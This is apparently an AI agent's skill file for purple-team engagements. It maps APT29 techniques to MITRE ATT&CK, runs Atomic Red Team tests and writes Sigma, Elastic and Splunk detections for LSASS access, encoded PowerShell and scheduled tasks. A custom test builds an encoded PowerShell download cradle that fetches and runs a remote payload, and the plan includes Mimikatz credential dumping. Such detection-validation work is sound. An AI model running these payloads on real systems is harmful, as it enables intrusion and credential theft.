## Cybersecurity Skills (Invoke First)

Before starting purple team operations, invoke these skills via the Skill tool:
- `cybersecurity-skills:mitre-attack-framework-integration`
- `cybersecurity-skills:detecting-evasion-techniques-in-endpoint-logs`
- `cybersecurity-skills:hunting-for-living-off-the-land-binaries`
- `cybersecurity-skills:detecting-living-off-the-land-attacks`
- `cybersecurity-skills:detecting-living-off-the-land-with-lolbas`
- `cybersecurity-skills:hunting-for-lolbins-execution-in-endpoint-logs`

## Scope Enforcement
Purple team operations MUST be coordinated with both offensive and defensive teams.
All techniques tested must be documented with detection results — this is the deliverable.
Never execute techniques that could cause data loss or service disruption without explicit approval.
ATT&CK technique execution requires pre-approval from both red and blue team leads.

## MITRE ATT&CK Mapping Methodology
```bash
mkdir -p evidence/$(date +%Y%m%d)/$TARGET/purple-team/{emulation,detection,navigator,logs,sigma}

# ATT&CK Navigator layer generation
# Install: pip install mitreattack-python
# pip install pyattck

python3 << 'PYEOF'
from mitreattack.attackToExcel import attackToExcel
import json

# Download latest ATT&CK data
attackToExcel("evidence/$(date +%Y%m%d)/$TARGET/purple-team/attack_data")

# Alternatively, use the ATT&CK STIX data directly
import requests
stix_url = "https://github.com/mitre/cti/raw/master/enterprise-attack/enterprise-attack.json"
# resp = requests.get(stix_url)
# Parse STIX objects for technique IDs, names, tactics
PYEOF
```

### ATT&CK Technique Selection
```bash
# Select techniques for emulation plan based on threat actor profile
# Example: APT29 (Cozy Bear) — TTPs relevant to the engagement

cat > evidence/$(date +%Y%m%d)/$TARGET/purple-team/emulation/technique_selection.json << 'EOF'
{
  "engagement": "$TARGET",
  "threat_actor": "APT29",
  "objective": "Validate detection coverage for credential access and lateral movement",
  "techniques": [
    {
      "id": "T1566.001",
      "name": "Spearphishing Attachment",
      "tactic": "Initial Access",
      "test_method": "Atomic Red Team T1566.001",
      "expected_detection": "Email gateway alert, EDR process creation from Office app",
      "priority": "HIGH"
    },
    {
      "id": "T1059.001",
      "name": "PowerShell",
      "tactic": "Execution",
      "test_method": "PowerShell download cradle with encoded command",
      "expected_detection": "AMSI alert, Sysmon EID 4103/4104 (PS script block logging)",
      "priority": "HIGH"
    },
    {
      "id": "T1003.001",
      "name": "LSASS Memory",
      "tactic": "Credential Access",
      "test_method": "Mimikatz credential dump (authorized tool)",
      "expected_detection": "Sysmon EID 10 (ProcessAccess to LSASS), EDR alert",
      "priority": "CRITICAL"
    },
    {
      "id": "T1087.002",
      "name": "Domain Account Discovery",
      "tactic": "Discovery",
      "test_method": "netexec smb $DC -u $USER -p $PASS --users",
      "expected_detection": "Security Event 4768/4769 (Kerberos), DC log anomalies",
      "priority": "MEDIUM"
    },
    {
      "id": "T1021.002",
      "name": "SMB/Windows Admin Shares",
      "tactic": "Lateral Movement",
      "test_method": "PSExec / WMI remote command execution",
      "expected_detection": "Security Event 4624 (logon type 3), EDR lateral movement alert",
      "priority": "HIGH"
    },
    {
      "id": "T1053.005",
      "name": "Scheduled Task",
      "tactic": "Persistence",
      "test_method": "schtasks /create /tn \"WindowsUpdate\" /tr \"cmd.exe /c whoami\"",
      "expected_detection": "Security Event 4698 (scheduled task created), Sysmon EID 1",
      "priority": "MEDIUM"
    },
    {
      "id": "T1071.001",
      "name": "Web Protocols",
      "tactic": "Command and Control",
      "test_method": "HTTPS beacon simulation with legitimate-looking traffic",
      "expected_detection": "Proxy log analysis, network anomaly detection",
      "priority": "HIGH"
    }
  ]
}
EOF
```

## Atomic Red Team Integration
```bash
# Install Atomic Red Team
# git clone https://github.com/redcanaryco/atomic-red-team.git /opt/atomic-red-team
# Import PowerShell module:
# Import-Module /opt/atomic-red-team/invocation/atomic-red-team.psd1

# Run specific technique test
# PowerShell (Windows):
Invoke-AtomicTest T1566.001 -TestNumbers 1 -ExecutionTimeoutSeconds 120 2>&1 | \
  tee evidence/$(date +%Y%m%d)/$TARGET/purple-team/logs/T1566.001_test1.log

# Run multiple tests for a technique
Invoke-AtomicTest T1059.001 -TestNumbers 1,2,3 2>&1 | \
  tee evidence/$(date +%Y%m%d)/$TARGET/purple-team/logs/T1059.001_tests.log

# List available tests for a technique
Invoke-AtomicTest T1059.001 -ShowDetails 2>&1

# Run technique with custom parameters
Invoke-AtomicTest T1003.001 -InputArgs @{
  "credential_file" = "C:\temp\dump.txt"
} 2>&1 | tee evidence/$(date +%Y%m%d)/$TARGET/purple-team/logs/T1003.001_custom.log

# Generate test results summary
Invoke-AtomicTest T1059.001 -CheckPrereqs 2>&1
```

### Custom Atomic Test (YAML Format)
```yaml
# custom-atomics/T1059-custom-ps-download.yaml
attack_technique: T1059.001
display_name: "PowerShell - Encoded Download Cradle"
description: |
  Simulates adversary using PowerShell to download and execute payload from remote server.
  Tests detection of encoded PS commands, AMSI scanning, and network connections.
supported_platforms:
  - windows
input_arguments:
  lhost:
    description: "Listener IP address"
    type: string
    default: "10.10.10.100"
  command:
    description: "Command to execute remotely"
    type: string
    default: "whoami"
executor:
  name: powershell
  elevation_required: false
  steps: |
    $cmd = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes("IEX (New-Object Net.WebClient).DownloadString('http://#{lhost}/payload.ps1')"))
    Start-Process powershell.exe -ArgumentList "-EncodedCommand", $cmd
  cleanup_command: |
    # No artifacts left on disk
```

## Detection Writing

### Sigma Rule Generation
```yaml
# sigma_rules/credential_access_lsass_dump.yml
title: Potential LSASS Memory Dump
id: 2a528eb0-e99c-4c5a-bc55-00a5e8e2e5c3
status: experimental
description: |
  Detects processes accessing LSASS memory, commonly associated with credential dumping.
  Covers Mimikatz, procdump, taskmgr, and custom memory readers.
references:
  - https://attack.mitre.org/techniques/T1003/001/
author: ThreatSwarm Purple Team
date: 2026/04/30
tags:
  - attack.credential_access
  - attack.t1003.001
logsource:
  category: process_access
  product: windows
detection:
  selection:
    TargetImage|endswith: '\lsass.exe'
    GrantedAccess:
      - '0x1f0fff'  # PROCESS_ALL_ACCESS
      - '0x143a'    # PROCESS_VM_READ | PROCESS_QUERY_INFORMATION
      - '0x1410'    # PROCESS_VM_READ | PROCESS_QUERY_LIMITED_INFORMATION
  filter_legitimate:
    SourceImage|endswith:
      - '\svchost.exe'
      - '\csrss.exe'
      - '\smss.exe'
      - '\wininit.exe'
  condition: selection and not filter_legitimate
falsepositives:
  - Legitimate antivirus scanning LSASS
  - Windows Error Reporting
level: high
```

```yaml
# sigma_rules/persistence_scheduled_task_creation.yml
title: Suspicious Scheduled Task Creation
id: 8f3c4d10-e77a-4e9a-a5c6-7b8d9e0f1a2b
status: experimental
description: |
  Detects creation of scheduled tasks that could be used for persistence.
  Focuses on tasks executing from unusual paths or with suspicious arguments.
references:
  - https://attack.mitre.org/techniques/T1053/005/
author: ThreatSwarm Purple Team
date: 2026/04/30
tags:
  - attack.persistence
  - attack.t1053.005
logsource:
  category: process_creation
  product: windows
detection:
  selection_schtasks:
    Image|endswith: '\schtasks.exe'
    CommandLine|contains:
      - '/create'
  selection_at:
    Image|endswith: '\at.exe'
  filter_system:
    ParentImage|endswith:
      - '\msiexec.exe'
      - '\setup.exe'
  suspicious_commands:
    CommandLine|contains:
      - 'powershell'
      - 'cmd.exe /c'
      - 'bitsadmin'
      - 'certutil'
      - 'regsvr32'
  condition: (selection_schtasks or selection_at) and suspicious_commands and not filter_system
falsepositives:
  - Legitimate software installers
  - System maintenance tasks
level: medium
```

### Elastic KQL Detection Queries
```bash
# Elasticsearch / Elastic SIEM queries for purple team validation

# Detect encoded PowerShell commands
cat > evidence/$(date +%Y%m%d)/$TARGET/purple-team/detection/elastic_encoded_ps.kql << 'EOF'
# Encoded PowerShell execution — T1059.001
event.category: "process" and event.type: "start" and
  process.name: "powershell.exe" and
  process.command_line: *EncodedCommand*
  and not process.parent.name: ("SCM.exe" or "TrustedInstaller.exe")
EOF

# Detect LSASS access — T1003.001
cat > evidence/$(date +%Y%m%d)/$TARGET/purple-team/detection/elastic_lsass_access.kql << 'EOF'
# Process accessing LSASS memory — T1003.001
event.category: "process" and event.type: "access" and
  target.process.name: "lsass.exe" and
  not source.process.name: ("csrss.exe" or "smss.exe" or "svchost.exe" or "wininit.exe")
  and target.process.granted_access: ("0x1f0fff" or "0x143a" or "0x1410")
EOF

# Detect scheduled task creation — T1053.005
cat > evidence/$(date +%Y%m%d)/$TARGET/purple-team/detection/elastic_schtasks.kql << 'EOF'
# Suspicious scheduled task creation — T1053.005
event.category: "process" and event.type: "start" and
  process.name: "schtasks.exe" and
  process.command_line: *create* and
  (
    process.command_line: *powershell* or
    process.command_line: *cmd.exe* or
    process.command_line: *bitsadmin* or
    process.command_line: *regsvr32*
  )
EOF
```

### Splunk SPL Detection Queries
```bash
# Splunk Search Processing Language queries

# Encoded PowerShell — T1059.001
cat > evidence/$(date +%Y%m%d)/$TARGET/purple-team/detection/splunk_encoded_ps.spl << 'EOF'
index=wineventlog EventCode=4688
  (Image="*\\powershell.exe" OR Image="*\\pwsh.exe")
  (CommandLine="*EncodedCommand*" OR CommandLine="*-enc *")
  NOT (ParentImage="*\\SCM.exe" OR ParentImage="*\\TrustedInstaller.exe")
| table _time, Computer, Image, CommandLine, ParentImage
EOF

# LSASS credential access — T1003.001
cat > evidence/$(date +%Y%m%d)/$TARGET/purple-team/detection/splunk_lsass.spl << 'EOF'
index=wineventlog sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=10
  TargetImage="*\\lsass.exe"
  NOT (SourceImage="*\\csrss.exe" OR SourceImage="*\\smss.exe" OR SourceImage="*\\svchost.exe")
  (GrantedAccess="0x1f0fff" OR GrantedAccess="0x143a" OR GrantedAccess="0x1410")
| table _time, Computer, SourceImage, SourceProcessId, TargetImage, TargetProcessId, GrantedAccess, CallTrace
EOF

# Lateral movement via PsExec/WMI — T1021.002
cat > evidence/$(date +%Y%m%d)/$TARGET/purple-team/detection/splunk_lateral.spl << 'EOF'
index=wineventlog (EventCode=4688 OR EventCode=4624)
  (
    (Image="*\\psexec.exe" OR Image="*\\psexec64.exe" OR CommandLine="*PsExec*") OR
    (Image="*\\wmic.exe" CommandLine="*node:*") OR
    (Image="*\\wmiapsrv.exe")
  )
| table _time, Computer, Image, CommandLine, LogonType, TargetUserName
EOF
```

## Purple Team Engagement Workflow
```bash
# Step-by-step purple team execution

# 1. Planning Phase
cat > evidence/$(date +%Y%m%d)/$TARGET/purple-team/emulation/engagement_plan.md << 'PLAN'
## Purple Team Engagement Plan — $TARGET — $(date -u +%Y-%m-%d)

### Objective
[Define what the engagement aims to validate]

### Scope
- Networks: [from scope.txt]
- Systems: [specific hosts/servers]
- Techniques: [ATT&CK technique IDs]

### Participants
- Red Team Lead: [name]
- Blue Team Lead: [name]
- Purple Team Coordinator: [name]

### Timeline
| Phase | Date | Activities |
|-------|------|-----------|
| Planning | [date] | Technique selection, rule preparation |
| Execution | [date] | Emulation and detection validation |
| Analysis | [date] | Gap analysis, report generation |

### Communication
- Slack/Teams channel: [channel]
- Escalation contact: [contact]
PLAN

# 2. Execute technique and verify detection
execute_technique() {
  local technique_id="$1"
  local test_number="${2:-1}"
  local description="$3"
  
  echo "[*] Executing T$technique_id: $description"
  
  # Run Atomic Red Team test
  powershell.exe -Command "Invoke-AtomicTest T$technique_id -TestNumbers $test_number" \
    2>&1 | tee evidence/$(date +%Y%m%d)/$TARGET/purple-team/logs/T${technique_id}_exec.log &
  
  EXEC_PID=$!
  sleep 120  # Wait for detection to trigger
  kill $EXEC_PID 2>/dev/null
  
  # Check detection logs
  echo "[*] Checking for detection alerts on T$technique_id..."
  # Query SIEM for alerts in the last 3 minutes
}

# 3. Record results
record_result() {
  local technique_id="$1" detected="$2" notes="$3"
  python3 -c "
import json
results_path = 'evidence/$(date +%Y%m%d)/$TARGET/purple-team/detection/results.json'
try:
    with open(results_path) as f:
        results = json.load(f)
except:
    results = {'techniques': [], 'summary': {}}

results['techniques'].append({
    'technique': 'T$technique_id',
    'detected': $detected,
    'notes': '$notes',
    'timestamp': '$(date -u +%Y-%m-%dT%H:%M:%SZ)'
})

tested = len(results['techniques'])
detected_count = len([t for t in results['techniques'] if t['detected']])
results['summary'] = {
    'total_tested': tested,
    'detected': detected_count,
    'coverage_percent': round(detected_count / tested * 100, 1) if tested > 0 else 0
}

with open(results_path, 'w') as f:
    json.dump(results, f, indent=2)
" 2>&1
}

# 4. Generate ATT&CK Navigator Layer
generate_navigator_layer() {
  python3 << 'PYEOF'
import json

results_path = 'evidence/$(date +%Y%m%d)/$TARGET/purple-team/detection/results.json'
output_path = 'evidence/$(date +%Y%m%d)/$TARGET/purple-team/navigator/coverage_layer.json'

with open(results_path) as f:
    results = json.load(f)

# Build Navigator layer
layer = {
    "version": "4.5",
    "name": "ThreatSwarm Purple Team — $TARGET",
    "domain": "enterprise-attack",
    "description": f"Detection coverage: {results['summary']['coverage_percent']}%",
    "filters": {"enterpriseDomain": "true"},
    "sorting": 0,
    "layout": {"layout": "side", "showName": True, "showID": False},
    "hideDisabled": False,
    "techniques": [],
    "gradient": {
        "colors": ["#ff6666", "#ffe766", "#66ff33"],
        "minValue": 0,
        "maxValue": 100
    },
    "legendItems": [
        {"label": "Detected", "color": "#66ff33"},
        {"label": "Not Detected", "color": "#ff6666"},
        {"label": "Not Tested", "color": "#ffffff"}
    ],
    "metadata": [],
    "links": [],
    "showTacticRowBackground": True,
    "tacticRowBackground": "#20507e"
}

for t in results['techniques']:
    technique_num = t['technique']
    color = "#66ff33" if t['detected'] else "#ff6666"
    layer['techniques'].append({
        "techniqueID": technique_num,
        "color": color,
        "enabled": True,
        "comment": t.get('notes', '')
    })

with open(output_path, 'w') as f:
    json.dump(layer, f, indent=2)

print(f"[+] Navigator layer generated: {output_path}")
print(f"[+] Import at: https://mitre-attack.github.io/attack-navigator/")
PYEOF
}
```

## Evidence Output
Write to `evidence/$(date +%Y%m%d)/$TARGET/purple-team/purple_team_report.md`:
```markdown
## Purple Team Report — $TARGET — $(date -u +%Y-%m-%dT%H:%M:%SZ)

### Engagement Summary
- Objective: [from plan]
- Techniques Tested: X
- Detection Rate: Y%

### ATT&CK Coverage
| # | Technique | Tactic | Test Method | Detected? | Detection Source | Alert Name |
|---|-----------|--------|-------------|-----------|-----------------|------------|

### Detection Gaps
| Technique | Tactic | Impact | Recommended Detection |
|-----------|--------|--------|----------------------|

### Detection Rules Created
| Rule Name | Technique | Platform | Status |
|-----------|-----------|----------|--------|

### Improvement Roadmap
| Priority | Gap | Recommendation | Effort | Owner |
|----------|-----|---------------|--------|-------|

### Navigator Layer
[Import coverage_layer.json at https://mitre-attack.github.io/attack-navigator/]
```
